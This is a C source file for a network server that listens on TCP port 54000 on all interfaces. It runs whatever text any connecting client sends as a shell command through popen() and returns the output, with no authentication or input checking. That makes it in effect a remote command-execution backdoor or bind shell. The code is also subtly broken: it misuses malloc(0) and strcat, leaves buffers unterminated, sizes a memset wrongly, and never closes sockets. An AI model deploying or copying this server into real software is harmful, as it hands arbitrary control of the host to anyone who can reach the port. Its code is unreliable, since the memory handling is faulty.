#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>

#define PORT 54000

const uint BUFFER_SIZE = 4095;
const uint MAX_CONNECTIONS = SOMAXCONN;
const int ALLOW_REUSE_ADDR = true;

char *execute(const char *command)
{
    FILE *cmd = popen(command, "r");

    int result_size = 0;
    char *result = (char *)malloc(result_size);

    char temp_result[8];
    while (fgets((char *)&temp_result, sizeof(temp_result), cmd) != NULL)
    {
        result = (char *)realloc(result, (result_size += sizeof(temp_result)));
        strcat(result, temp_result);
    }

    pclose(cmd);
    return result;

    //      command = (char *)realloc(command, (size + strlen(argv[i]) + 1));
    // strcat(command, argv[i]);
    return 0;
}

int main()
{
    int master_socket;
    int master_socket_addres_lenght;
    int new_socket;
    int client_socket[MAX_CONNECTIONS];
    int activity;
    int valread;
    int sd;
    int max_sd;
    struct sockaddr_in address;

    char buffer[BUFFER_SIZE];

    //set of socket descriptors
    fd_set readfds;

    //initialise all client_socket[] to 0 so not checked
    for (int i = 0; i < MAX_CONNECTIONS; i++)
    {
        client_socket[i] = 0;
    }

    //create a master socket
    if ((master_socket = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    //set master socket to allow multiple connections ,
    //this is just a good habit, it will work without this
    if (setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&ALLOW_REUSE_ADDR,
                   sizeof(ALLOW_REUSE_ADDR)) < 0)
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    //type of socket created
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(master_socket, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    printf("Listener on port %d \n", PORT);

    //try to specify maximum of 3 pending connections for the master socket
    if (listen(master_socket, 3) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    //accept the incoming connection
    master_socket_addres_lenght = sizeof(address);
    puts("Waiting for connections ...");

    for (;;)
    {
        //clear the socket set
        FD_ZERO(&readfds);

        //add master socket to set
        FD_SET(master_socket, &readfds);
        max_sd = master_socket;

        //add child sockets to set
        for (int i = 0; i < MAX_CONNECTIONS; i++)
        {
            //socket descriptor
            sd = client_socket[i];

            //if valid socket descriptor then add to read list
            if (sd > 0)
                FD_SET(sd, &readfds);

            //highest file descriptor number, need it for the select function
            if (sd > max_sd)
                max_sd = sd;
        }

        //wait for an activity on one of the sockets , timeout is NULL ,
        //so wait indefinitely
        activity = select(max_sd + 1, &readfds, NULL, NULL, NULL);

        if ((activity < 0) && (errno != EINTR))
        {
            printf("select error");
        }

        //If something happened on the master socket ,
        //then its an incoming connection
        if (FD_ISSET(master_socket, &readfds))
        {
            if ((new_socket = accept(master_socket, (struct sockaddr *)&address, (socklen_t *)&master_socket_addres_lenght)) < 0)
            {
                perror("accept");
                exit(EXIT_FAILURE);
            }

            printf("\nNew connection , socket fd is %d , ip is : %s , port : %d \n", new_socket, inet_ntoa(address.sin_addr), ntohs(address.sin_port));

            char client_message[BUFFER_SIZE];
            recv(new_socket, &client_message, sizeof(client_message), 0);

            char *response = execute(client_message);

            if (send(new_socket, response, strlen(response), 0) != strlen(response))
            {
                perror("send");
            }
            memset(client_message, 0, sizeof(client_message));
            memset(response, 0, sizeof(response));

        }
    }

    return 0;
}